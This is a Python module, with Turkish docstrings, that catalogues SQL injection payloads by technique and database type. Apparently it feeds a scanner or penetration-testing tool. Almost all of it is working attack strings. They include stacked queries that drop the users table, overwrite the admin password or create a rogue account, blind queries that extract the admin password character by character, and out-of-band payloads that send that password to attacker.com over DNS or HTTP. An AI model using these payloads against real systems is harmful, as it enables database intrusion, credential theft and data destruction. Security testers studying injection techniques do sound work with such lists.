from enum import Enum
from dataclasses import dataclass
from typing import List, Optional, Set

class SQLInjectionType(Enum):
    """SQL Injection türleri"""
    BOOLEAN = "Boolean-based"
    ERROR = "Error-based"
    TIME = "Time-based"
    UNION = "Union-based"
    STACKED = "Stacked queries"
    OUT_OF_BAND = "Out-of-band"
    BLIND = "Blind"

class DatabaseType(Enum):
    """Veritabanı türleri"""
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "Microsoft SQL Server"
    ORACLE = "Oracle"
    SQLITE = "SQLite"
    MONGODB = "MongoDB"

@dataclass
class SQLInjectionPayload:
    """SQL Injection payload veri sınıfı"""
    value: str
    injection_type: SQLInjectionType
    database_type: DatabaseType
    description: str
    success_indicators: Optional[List[str]] = None
    waf_bypass: bool = False

class PayloadGenerator:
    """SQL Injection payload üreteci"""
    
    @staticmethod
    def get_boolean_payloads() -> List[SQLInjectionPayload]:
        """Boolean tabanlı SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="' AND '1'='1",
                injection_type=SQLInjectionType.BOOLEAN,
                database_type=DatabaseType.MYSQL,
                description="Basic AND condition",
                success_indicators=["true"]
            ),
            SQLInjectionPayload(
                value="' AND '1'='2",
                injection_type=SQLInjectionType.BOOLEAN,
                database_type=DatabaseType.MYSQL,
                description="False AND condition",
                success_indicators=["false"]
            ),
            SQLInjectionPayload(
                value="' OR '1'='1",
                injection_type=SQLInjectionType.BOOLEAN,
                database_type=DatabaseType.MYSQL,
                description="Basic OR condition",
                success_indicators=["true"]
            ),
            SQLInjectionPayload(
                value="1' AND IF(1=1,true,false)--",
                injection_type=SQLInjectionType.BOOLEAN,
                database_type=DatabaseType.MYSQL,
                description="IF condition",
                success_indicators=["true"]
            ),
            SQLInjectionPayload(
                value="1' AND (SELECT CASE WHEN (1=1) THEN true ELSE false END)--",
                injection_type=SQLInjectionType.BOOLEAN,
                database_type=DatabaseType.POSTGRESQL,
                description="CASE statement",
                success_indicators=["true"]
            )
        ]
    
    @staticmethod
    def get_error_payloads() -> List[SQLInjectionPayload]:
        """Error tabanlı SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                injection_type=SQLInjectionType.ERROR,
                database_type=DatabaseType.MYSQL,
                description="GROUP BY error",
                success_indicators=["Duplicate entry"]
            ),
            SQLInjectionPayload(
                value="' AND CAST((SELECT version()) AS int)--",
                injection_type=SQLInjectionType.ERROR,
                database_type=DatabaseType.POSTGRESQL,
                description="CAST error",
                success_indicators=["invalid input syntax"]
            ),
            SQLInjectionPayload(
                value="' AND 1=CTX_DOC.HIGHLIGHT('SYS.DUAL','VERSION')--",
                injection_type=SQLInjectionType.ERROR,
                database_type=DatabaseType.ORACLE,
                description="CTX_DOC error",
                success_indicators=["ORA-"]
            ),
            SQLInjectionPayload(
                value="' AND 1=CONVERT(int,(SELECT @@version))--",
                injection_type=SQLInjectionType.ERROR,
                database_type=DatabaseType.MSSQL,
                description="CONVERT error",
                success_indicators=["Conversion failed"]
            )
        ]
    
    @staticmethod
    def get_time_payloads() -> List[SQLInjectionPayload]:
        """Time tabanlı SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="' AND IF(1=1,SLEEP(5),0)--",
                injection_type=SQLInjectionType.TIME,
                database_type=DatabaseType.MYSQL,
                description="SLEEP function",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
                injection_type=SQLInjectionType.TIME,
                database_type=DatabaseType.POSTGRESQL,
                description="PG_SLEEP function",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="' WAITFOR DELAY '0:0:5'--",
                injection_type=SQLInjectionType.TIME,
                database_type=DatabaseType.MSSQL,
                description="WAITFOR DELAY",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL)--",
                injection_type=SQLInjectionType.TIME,
                database_type=DatabaseType.ORACLE,
                description="DBMS_PIPE delay",
                success_indicators=["timeout"]
            )
        ]
    
    @staticmethod
    def get_union_payloads() -> List[SQLInjectionPayload]:
        """UNION tabanlı SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="' UNION SELECT NULL--",
                injection_type=SQLInjectionType.UNION,
                database_type=DatabaseType.MYSQL,
                description="Basic UNION",
                success_indicators=["NULL"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT NULL,NULL--",
                injection_type=SQLInjectionType.UNION,
                database_type=DatabaseType.MYSQL,
                description="Two column UNION",
                success_indicators=["NULL"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT @@version,NULL--",
                injection_type=SQLInjectionType.UNION,
                database_type=DatabaseType.MYSQL,
                description="Version UNION",
                success_indicators=["version"]
            ),
            SQLInjectionPayload(
                value="' UNION SELECT table_name,NULL FROM information_schema.tables--",
                injection_type=SQLInjectionType.UNION,
                database_type=DatabaseType.MYSQL,
                description="Table names UNION",
                success_indicators=["tables"]
            )
        ]
    
    @staticmethod
    def get_stacked_payloads() -> List[SQLInjectionPayload]:
        """Stacked query SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="'; INSERT INTO users (username,password) VALUES ('hacker','pass')--",
                injection_type=SQLInjectionType.STACKED,
                database_type=DatabaseType.MYSQL,
                description="INSERT query",
                success_indicators=["success"]
            ),
            SQLInjectionPayload(
                value="'; DROP TABLE users--",
                injection_type=SQLInjectionType.STACKED,
                database_type=DatabaseType.MYSQL,
                description="DROP TABLE",
                success_indicators=["success"]
            ),
            SQLInjectionPayload(
                value="'; UPDATE users SET password='hacked' WHERE username='admin'--",
                injection_type=SQLInjectionType.STACKED,
                database_type=DatabaseType.MYSQL,
                description="UPDATE query",
                success_indicators=["success"]
            ),
            SQLInjectionPayload(
                value="'; CREATE USER hacker IDENTIFIED BY 'pass'--",
                injection_type=SQLInjectionType.STACKED,
                database_type=DatabaseType.MYSQL,
                description="CREATE USER",
                success_indicators=["success"]
            )
        ]
    
    @staticmethod
    def get_out_of_band_payloads() -> List[SQLInjectionPayload]:
        """Out-of-band SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\\\a.txt'))--",
                injection_type=SQLInjectionType.OUT_OF_BAND,
                database_type=DatabaseType.MYSQL,
                description="DNS exfiltration",
                success_indicators=["dns"]
            ),
            SQLInjectionPayload(
                value="'; DECLARE @host varchar(1024);SELECT @host=(SELECT password FROM users WHERE username='admin')+'.attacker.com';EXEC('master..xp_dirtree \"\\\\'+@host+'\\c$\"')--",
                injection_type=SQLInjectionType.OUT_OF_BAND,
                database_type=DatabaseType.MSSQL,
                description="xp_dirtree DNS",
                success_indicators=["dns"]
            ),
            SQLInjectionPayload(
                value="' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--",
                injection_type=SQLInjectionType.OUT_OF_BAND,
                database_type=DatabaseType.ORACLE,
                description="HTTP request",
                success_indicators=["http"]
            )
        ]
    
    @staticmethod
    def get_blind_payloads() -> List[SQLInjectionPayload]:
        """Blind SQL Injection payloadları"""
        return [
            SQLInjectionPayload(
                value="' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>32--",
                injection_type=SQLInjectionType.BLIND,
                database_type=DatabaseType.MYSQL,
                description="Binary search",
                success_indicators=["true"]
            ),
            SQLInjectionPayload(
                value="' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>32) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
                injection_type=SQLInjectionType.BLIND,
                database_type=DatabaseType.POSTGRESQL,
                description="Time-based blind",
                success_indicators=["timeout"]
            ),
            SQLInjectionPayload(
                value="' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE NULL END FROM users)--",
                injection_type=SQLInjectionType.BLIND,
                database_type=DatabaseType.POSTGRESQL,
                description="Error-based blind",
                success_indicators=["division by zero"]
            )
        ] 